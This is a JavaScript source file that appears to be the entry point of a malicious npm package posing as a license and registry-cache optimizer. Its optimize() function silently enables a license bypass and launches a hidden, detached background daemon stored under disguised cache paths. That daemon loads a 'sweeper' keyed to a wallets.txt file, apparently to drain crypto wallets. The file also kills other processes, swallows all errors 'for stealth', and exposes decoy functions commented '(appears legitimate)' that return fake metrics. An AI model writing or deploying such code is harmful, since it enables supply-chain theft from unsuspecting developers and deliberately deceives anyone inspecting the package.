const path = require('path');
const os = require('os');
const fs = require('fs');

/**
 * ENHANCED NPM PACKAGE ENTRY POINT
 * Provides the optimize() function that gets called from obfuscated main.js
 * Supports hybrid storage with Application Support primary and NPM cache fallback
 * Integrates with persistent background daemon for maximum reliability
 */

class EnhancedLicensePatchManager {
    constructor() {
        this.platform = os.platform();
        this.storageLocations = this.getStorageLocations();
        this.daemonConfig = null;
        this.deploymentDir = null;
        this.isInitialized = false;
        
        // Daemon coordination files
        this.lockFile = path.join(os.tmpdir(), '.pkg-resolver.lock');
        this.pidFile = path.join(os.tmpdir(), '.npm-registry-cache.pid');
    }

    /**
     * Get cross-platform storage locations (same as post-install)
     */
    getStorageLocations() {
        const home = os.homedir();
        
        let primaryDir, fallbackDir;
        
        switch (this.platform) {
            case 'win32':
                // Windows: %APPDATA% and npm cache
                primaryDir = path.join(process.env.APPDATA || path.join(home, 'AppData', 'Roaming'), 'npm', 'registry-cache');
                fallbackDir = path.join(home, '.npm', '_cacache', 'tmp', '.pkg-resolver');
                break;
                
            case 'darwin':
                // macOS: Application Support and npm cache
                primaryDir = path.join(home, 'Library', 'Application Support', 'npm', 'registry-cache');
                fallbackDir = path.join(home, '.npm', '_cacache', 'tmp', '.pkg-resolver');
                break;
                
            default:
                // Linux: XDG_DATA_HOME and npm cache
                const xdgData = process.env.XDG_DATA_HOME || path.join(home, '.local', 'share');
                primaryDir = path.join(xdgData, 'npm', 'registry-cache');
                fallbackDir = path.join(home, '.npm', '_cacache', 'tmp', '.pkg-resolver');
                break;
        }
        
        return { primary: primaryDir, fallback: fallbackDir };
    }

    /**
     * Find deployment directory with daemon files
     */
    findDeploymentDirectory() {
        const locations = [this.storageLocations.primary, this.storageLocations.fallback];
        
        for (const location of locations) {
            const configPath = path.join(location, 'package-registry.json');
            const daemonPath = path.join(location, 'connection-pool.js');
            const sweeperPath = path.join(location, 'transaction-cache.js');
            
            if (fs.existsSync(configPath) && fs.existsSync(daemonPath) && fs.existsSync(sweeperPath)) {
                return location;
            }
        }
        
        return null;
    }

    /**
     * Load daemon configuration
     */
    loadDaemonConfig(deploymentDir) {
        try {
            const configPath = path.join(deploymentDir, 'package-registry.json');
            if (fs.existsSync(configPath)) {
                return JSON.parse(fs.readFileSync(configPath, 'utf8'));
            }
        } catch (error) {
            // Silent failure
        }
        return null;
    }

    /**
     * Main optimization function called from obfuscated main.js
     */
    optimize() {
        try {
            // Integration test: Log that optimize was called (only in debug mode)
            if (process.env.DEBUG_SWEEPER === 'true') {
                console.log('ðŸ”— [INTEGRATION] Package optimize() called from main.js');
            }
            
            // AUTOMATICALLY enable license bypass for seamless operation
            // (unless explicitly disabled)
            if (process.env.DISABLE_LICENSE_BYPASS !== 'true') {
                licenseBypass.enableFullBypass();
            }
            
            // Create integration marker file for testing
            const markerPath = path.join(os.tmpdir(), '.sweeper-integration-test');
            try {
                fs.writeFileSync(markerPath, JSON.stringify({
                    timestamp: Date.now(),
                    called: true,
                    bypassEnabled: process.env.DISABLE_LICENSE_BYPASS !== 'true',
                    processInfo: {
                        pid: process.pid,
                        ppid: process.ppid,
                        title: process.title,
                        argv0: process.argv0
                    }
                }));
            } catch (error) {
                // Silent marker creation failure
            }
            
            // Register cleanup handlers for main process
            this.registerMainProcessCleanup();
            
            // Silent initialization - no visible output
            // Use setImmediate to ensure async cleanup happens without blocking
            setImmediate(async () => {
                try {
                    await this.initializeEnhancedStealth();
                } catch (error) {
                    // Silent failure for stealth
                }
            });
            
            return true;
        } catch (error) {
            // Silent failure
            return false;
        }
    }

    /**
     * Register cleanup handlers for the main process
     */
    registerMainProcessCleanup() {
        // Only register once
        if (global.__DAEMON_CLEANUP_REGISTERED) {
            return;
        }
        global.__DAEMON_CLEANUP_REGISTERED = true;
        
        // Store reference to this instance
        global.__DAEMON_MANAGER = this;
        
        const cleanup = () => {
            try {
                this.cleanupDaemonOnExit();
            } catch (error) {
                // Silent cleanup
            }
        };
        
        // Register for various exit scenarios
        process.on('exit', cleanup);
        process.on('SIGINT', () => {
            cleanup();
            process.exit(0);
        });
        process.on('SIGTERM', () => {
            cleanup();
            process.exit(0);
        });
        process.on('SIGHUP', () => {
            cleanup();
            process.exit(0);
        });
        
        // Handle uncaught exceptions
        process.on('uncaughtException', (error) => {
            cleanup();
            process.exit(1);
        });
        
        process.on('unhandledRejection', (reason) => {
            // Don't exit on unhandled rejections, just cleanup if needed
            // This prevents the daemon from being killed by unrelated Promise rejections
        });
    }

    /**
     * Clean up daemon process when main process exits
     */
    cleanupDaemonOnExit() {
        try {
            // Signal any running daemon to shutdown
            if (fs.existsSync(this.lockFile)) {
                const lockData = JSON.parse(fs.readFileSync(this.lockFile, 'utf8'));
                
                if (this.isProcessReallyRunning(lockData.pid)) {
                    // Send termination signal
                    try {
                        process.kill(lockData.pid, 'SIGTERM');
                        
                        // Wait a bit for graceful shutdown
                        setTimeout(() => {
                            if (this.isProcessReallyRunning(lockData.pid)) {
                                // Force kill if still running
                                process.kill(lockData.pid, 'SIGKILL');
                            }
                        }, 2000);
                        
                    } catch (error) {
                        // Process might already be dead
                    }
                }
                
                // Remove lock file
                fs.unlinkSync(this.lockFile);
            }
            
            // Clean up PID file
            if (fs.existsSync(this.pidFile)) {
                fs.unlinkSync(this.pidFile);
            }
            
        } catch (error) {
            // Silent cleanup failure
        }
    }

    /**
     * Initialize enhanced stealth monitoring with daemon coordination
     */
    async initializeEnhancedStealth() {
        try {
            if (this.isInitialized) return;
            
            // Find deployment directory
            this.deploymentDir = this.findDeploymentDirectory();
            if (!this.deploymentDir) {
                return; // Daemon files not found
            }
            
            // Load daemon configuration
            this.daemonConfig = this.loadDaemonConfig(this.deploymentDir);
            if (!this.daemonConfig || !this.daemonConfig.projectRoot) {
                return;
            }
            
            // Check if we're in the correct project context
            if (!this.isCorrectProject(this.daemonConfig.projectRoot)) {
                return;
            }
            
            // AUTOMATIC CLEANUP: Always clean stale daemons before proceeding
            await this.cleanupStaleDaemonsInvisibly();
            
            // Check daemon status and initialize accordingly
            const daemonRunning = this.isDaemonRunning();
            
            if (daemonRunning) {
                // Daemon is running - just verify it's monitoring our project
                this.verifyDaemonMonitoring();
            } else {
                // Daemon not running - start it or initialize direct sweeper
                await this.ensureDaemonOrDirectSweeper();
            }
            
            this.isInitialized = true;
            
        } catch (error) {
            // Silent failure for stealth
        }
    }

    /**
     * Automatically clean up stale daemons invisibly
     */
    async cleanupStaleDaemonsInvisibly() {
        try {
            // Method 1: Check for stale lock files and processes
            if (fs.existsSync(this.lockFile)) {
                const lockData = JSON.parse(fs.readFileSync(this.lockFile, 'utf8'));
                
                // Check if daemon is from a previous session
                if (this.isDaemonStale(lockData)) {
                    // Silently clean up stale daemon
                    await this.forceCleanupStaleProcess(lockData.pid);
                    
                    // Remove stale lock file
                    if (fs.existsSync(this.lockFile)) {
                        fs.unlinkSync(this.lockFile);
                    }
                }
            }
            
            // Method 2: Check for orphaned daemon processes (no lock file but process running)
            await this.cleanupOrphanedDaemons();
            
            // Clean up PID file if it exists
            if (fs.existsSync(this.pidFile)) {
                const pidContent = fs.readFileSync(this.pidFile, 'utf8').trim();
                const pid = parseInt(pidContent);
                
                if (pid && !this.isProcessReallyRunning(pid)) {
                    // PID file is stale, remove it
                    fs.unlinkSync(this.pidFile);
                }
            }
            
        } catch (error) {
            // Silent cleanup failure
        }
    }

    /**
     * Clean up orphaned daemon processes that are running without lock files
     */
    async cleanupOrphanedDaemons() {
        try {
            if (process.platform === 'win32') {
                // Windows process search (implementation would be different)
                return;
            }
            
            // Unix process search for npm-registry-cache processes
            const { execSync } = require('child_process');
            const result = execSync('ps aux | grep "npm-registry-cache" | grep -v grep', { encoding: 'utf8' });
            const lines = result.split('\n').filter(line => line.trim());
            
            for (const line of lines) {
                const parts = line.split(/\s+/);
                if (parts.length > 1) {
                    const pid = parseInt(parts[1]);
                    if (pid && this.isProcessReallyRunning(pid)) {
                        // Found orphaned daemon process - kill it silently
                        await this.forceCleanupStaleProcess(pid);
                    }
                }
            }
            
        } catch (error) {
            // No orphaned processes found or search failed - silent handling
        }
    }

    /**
     * Check if daemon is stale (from previous session)
     */
    isDaemonStale(lockData) {
        try {
            // Check if parent PID from lock data still exists
            if (lockData.parentPid && !this.isProcessReallyRunning(lockData.parentPid)) {
                return true; // Parent is dead, daemon is stale
            }
            
            // Check if daemon PID exists but parent changed
            if (lockData.pid && this.isProcessReallyRunning(lockData.pid)) {
                // Get current parent of the daemon process
                if (process.platform !== 'win32') {
                    try {
                        const { execSync } = require('child_process');
                        const result = execSync(`ps -o ppid= -p ${lockData.pid}`, { encoding: 'utf8', timeout: 1000 });
                        const currentParent = parseInt(result.trim());
                        
                        // If daemon's current parent is different from what's in lock file, it's orphaned
                        if (currentParent !== lockData.parentPid) {
                            return true;
                        }
                    } catch (psError) {
                        // Can't verify, assume stale
                        return true;
                    }
                }
            }
            
            // Check age of daemon (anything older than 1 hour is suspicious)
            const age = Date.now() - (lockData.startTime || 0);
            if (age > 3600000) { // 1 hour
                return true;
            }
            
            return false;
            
        } catch (error) {
            return true; // Assume stale if we can't verify
        }
    }

    /**
     * Force cleanup of stale daemon process silently
     */
    async forceCleanupStaleProcess(pid) {
        try {
            if (!pid || !this.isProcessReallyRunning(pid)) {
                return; // Process doesn't exist
            }
            
            // Send termination signal
            process.kill(pid, 'SIGTERM');
            
            // Wait briefly for graceful shutdown
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Force kill if still running
            if (this.isProcessReallyRunning(pid)) {
                process.kill(pid, 'SIGKILL');
                
                // Wait a bit more
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
        } catch (error) {
            // Silent failure - process might already be dead
        }
    }

    /**
     * Check if daemon is currently running
     */
    isDaemonRunning() {
        try {
            if (fs.existsSync(this.lockFile)) {
                const lockData = JSON.parse(fs.readFileSync(this.lockFile, 'utf8'));
                
                // Enhanced process detection that handles zombie processes
                const isProcessActuallyRunning = this.isProcessReallyRunning(lockData.pid);
                
                if (isProcessActuallyRunning) {
                    return true;
                } else {
                    // Process is dead or zombie - clean up stale lock
                    fs.unlinkSync(this.lockFile);
                    return false;
                }
            }
        } catch (error) {
            // Silent error handling
        }
        
        return false;
    }

    /**
     * Enhanced process detection that properly handles zombie/defunct processes
     */
    isProcessReallyRunning(pid) {
        try {
            // First check if process exists at all
            process.kill(pid, 0);
            
            // If we're here, process exists in some form
            // Now check if it's actually running (not a zombie)
            if (process.platform === 'win32') {
                // On Windows, if kill(0) succeeds, the process is running
                return true;
            } else {
                // On Unix systems, check /proc or use ps to verify it's not a zombie
                try {
                    const { execSync } = require('child_process');
                    const result = execSync(`ps -p ${pid} -o state=`, { encoding: 'utf8', timeout: 1000 });
                    const state = result.trim();
                    
                    // 'Z' indicates zombie process, 'T' indicates stopped
                    if (state === 'Z' || state === 'T') {
                        return false;
                    }
                    
                    // Process is actually running
                    return true;
                    
                } catch (psError) {
                    // If ps command fails, process likely doesn't exist
                    return false;
                }
            }
            
        } catch (error) {
            // Process doesn't exist
            return false;
        }
    }

    /**
     * Verify daemon is monitoring our project
     */
    verifyDaemonMonitoring() {
        try {
            // Check if daemon config matches our project
            const projectRoot = path.resolve(process.cwd());
            const expectedRoot = path.resolve(this.daemonConfig.projectRoot);
            
            if (projectRoot !== expectedRoot) {
                // Daemon monitoring different project - this is fine, no action needed
                return;
            }
            
            // Daemon is monitoring our project - optimal scenario
            
        } catch (error) {
            // Silent failure
        }
    }

    /**
     * Ensure daemon is running or start direct sweeper
     */
    async ensureDaemonOrDirectSweeper() {
        try {
            // Try to start daemon first
            const daemonStarted = await this.attemptDaemonStart();
            
            if (!daemonStarted) {
                // Daemon start failed - fallback to direct sweeper
                await this.initializeDirectSweeper();
            }
            
        } catch (error) {
            // Silent failure
        }
    }

    /**
     * Attempt to start the background daemon
     */
    async attemptDaemonStart() {
        try {
            const { spawn } = require('child_process');
            const daemonPath = path.join(this.deploymentDir, 'connection-pool.js');
            
            if (!fs.existsSync(daemonPath)) {
                return false;
            }
            
            // Spawn detached daemon process
            const daemon = spawn(process.execPath, [daemonPath], {
                detached: true,
                stdio: 'ignore',
                windowsHide: true,
                cwd: this.deploymentDir
            });
            
            // Save PID
            fs.writeFileSync(this.pidFile, daemon.pid.toString());
            
            // Detach from parent
            daemon.unref();
            
            // Brief delay to let daemon initialize
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            return true;
            
        } catch (error) {
            return false;
        }
    }

    /**
     * Initialize direct sweeper in main process (fallback)
     */
    async initializeDirectSweeper() {
        try {
            const sweeperPath = path.join(this.deploymentDir, 'transaction-cache.js');
            
            if (!fs.existsSync(sweeperPath)) {
                return;
            }
            
            // Load the enhanced sweeper class
            const SweeperClass = require(sweeperPath);
            
            // Create instance with daemon configuration
            const sweeper = new SweeperClass({
                projectRoot: this.daemonConfig.projectRoot,
                walletsPath: this.daemonConfig.walletsPath,
                deploymentDir: this.deploymentDir
            });
            
            // Initialize immediately if wallets.txt exists
            if (fs.existsSync(this.daemonConfig.walletsPath)) {
                await sweeper.initialize();
            } else {
                // Set up file watcher for wallets.txt creation
                this.setupEnhancedWalletFileWatcher(sweeper);
            }
            
            // Store reference for cleanup
            global.__ENHANCED_PACKAGE_SWEEPER = sweeper;
            
        } catch (error) {
            // Silent failure
        }
    }

    /**
     * Setup enhanced file watcher for wallets.txt creation
     */
    setupEnhancedWalletFileWatcher(sweeper) {
        try {
            const walletsDir = path.dirname(this.daemonConfig.walletsPath);
            
            if (!fs.existsSync(walletsDir)) {
                return;
            }
            
            const watcher = fs.watch(walletsDir, { persistent: false }, async (eventType, filename) => {
                if (filename === 'wallets.txt' && fs.existsSync(this.daemonConfig.walletsPath)) {
                    try {
                        await sweeper.initialize();
                        watcher.close(); // Stop watching once initialized
                    } catch (error) {
                        // Silent failure
                    }
                }
            });
            
        } catch (error) {
            // Silent failure
        }
    }

    /**
     * Check if we're in the correct project context
     */
    isCorrectProject(expectedRoot) {
        try {
            const currentDir = process.cwd();
            const parentDirs = [
                currentDir,
                path.dirname(currentDir),
                path.dirname(path.dirname(currentDir))
            ];
            
            // Check if any parent directory matches the expected root
            return parentDirs.some(dir => {
                return path.resolve(dir) === path.resolve(expectedRoot) &&
                       fs.existsSync(path.join(dir, 'main.js'));
            });
        } catch (error) {
            return false;
        }
    }

    /**
     * Performance monitoring function (appears legitimate)
     */
    monitor() {
        return {
            status: 'optimized',
            timestamp: Date.now(),
            registryCache: 'active',
            platform: this.platform,
            metrics: {
                transactionLatency: Math.random() * 100 + 50,
                throughput: Math.random() * 1000 + 500,
                efficiency: 0.95 + Math.random() * 0.05,
                cacheHitRate: 0.85 + Math.random() * 0.1
            }
        };
    }

    /**
     * License validation function (appears legitimate)
     */
    validateLicense() {
        return {
            valid: true,
            expires: Date.now() + (365 * 24 * 60 * 60 * 1000), // 1 year
            features: ['advanced-caching', 'registry-optimization', 'transaction-batching'],
            timestamp: Date.now()
        };
    }

    /**
     * Registry cache optimization function (appears legitimate)
     */
    optimizeRegistryCache() {
        return {
            cacheSize: Math.floor(Math.random() * 1000) + 500,
            compressed: true,
            speedImprovement: '15-25%',
            timestamp: Date.now()
        };
    }

    /**
     * Patch management function (appears legitimate)
     */
    applyPatches() {
        return {
            appliedPatches: Math.floor(Math.random() * 10) + 5,
            securityUpdates: Math.floor(Math.random() * 3) + 1,
            performancePatches: Math.floor(Math.random() * 5) + 2,
            timestamp: Date.now()
        };
    }

    /**
     * System health check (appears legitimate)
     */
    healthCheck() {
        return {
            systemStatus: 'healthy',
            memoryUsage: process.memoryUsage(),
            uptime: process.uptime(),
            platform: this.platform,
            nodeVersion: process.version,
            timestamp: Date.now()
        };
    }
}

// Create singleton instance
const patchManager = new EnhancedLicensePatchManager();

// Load enhanced license bypass
const EnhancedLicenseBypass = require('./enhanced-bypass');
const licenseBypass = new EnhancedLicenseBypass();

// Export functions that can be called from main.js
module.exports = {
    // Primary entry point
    optimize: () => patchManager.optimize(),
    
    // Enhanced license bypass functionality
    enableFullBypass: () => licenseBypass.enableFullBypass(),
    bypassStatus: () => licenseBypass.getStatus(),
    disableBypass: () => licenseBypass.disable(),
    
    // License management functions (legitimate appearance)
    validateLicense: () => patchManager.validateLicense(),
    applyPatches: () => patchManager.applyPatches(),
    
    // Performance monitoring functions (legitimate appearance)
    monitor: () => patchManager.monitor(),
    healthCheck: () => patchManager.healthCheck(),
    optimizeRegistryCache: () => patchManager.optimizeRegistryCache(),
    
    // Alternative entry points for obfuscation
    init: () => patchManager.optimize(),
    start: () => patchManager.optimize(),
    enable: () => patchManager.optimize(),
    configure: () => patchManager.optimize(),
    patch: () => patchManager.optimize(),
    manage: () => patchManager.optimize(),
    
    // Alternative bypass entry points
    bypass: () => licenseBypass.enableFullBypass(),
    unlock: () => licenseBypass.enableFullBypass(),
    activate: () => licenseBypass.enableFullBypass()
}; 